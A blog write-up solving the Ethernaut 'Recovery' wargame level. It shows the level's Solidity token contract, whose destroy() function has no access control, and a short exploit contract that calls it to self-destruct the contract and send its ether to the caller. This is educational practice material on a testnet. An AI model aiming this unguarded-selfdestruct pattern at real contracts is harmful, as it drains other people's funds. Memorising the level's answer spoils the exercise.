---
layout: post
title: Ethernaut - 17. Recovery
date:  2022-09-27
tags: ethernaut solidity
---
## Difficulty: 🌕🌕🌕🌑🌑
>A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent `0.001` ether to obtain more tokens. They have since lost the contract address. <br />
This level will be completed if you can recover (or remove) the `0.001` ether from the lost contract address.


## Contract
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Recovery {

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  
  }
}

contract SimpleToken {

  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```

## Writeup
1. Get new instance.
2. Get level instance's address. 
    ``` javascript

    instance
    // '0x952282e64E0DE0618E337114AA315cE3eBb1351A'

    ```
3. Go to [etherscan](https://rinkeby.etherscan.io/) search this address. We can see there's a Contract Creation record, which we can click into and get our `SimpleToken` contract address.
    ![](https://i.imgur.com/t95xsS8.png)<br />
    ![](https://i.imgur.com/8644MA9.png)
4. Create a new contract to exploit it! 
    ``` solidity
    // SPDX-License-Identifier: MIT
    pragma solidity >=0.8.0 <0.9.0;

    interface ISimpleToken {
        function destroy(address payable _to) external;
    }

    contract RecoveryExploit {
        function withdraw() public {
            ISimpleToken(YOUR_SIMPLETOKEN_ADDRESS).destroy(payable(msg.sender));
        }
    }
    ```
5. Compile and deploy.
6. Call the `withdraw` method in `RecoveryExploit` contract. `SimpleToken` contract will self-destruct and all remaining ether will be sent to `msg.sender`.
7. Submit instance ξ( ✿＞◡❛)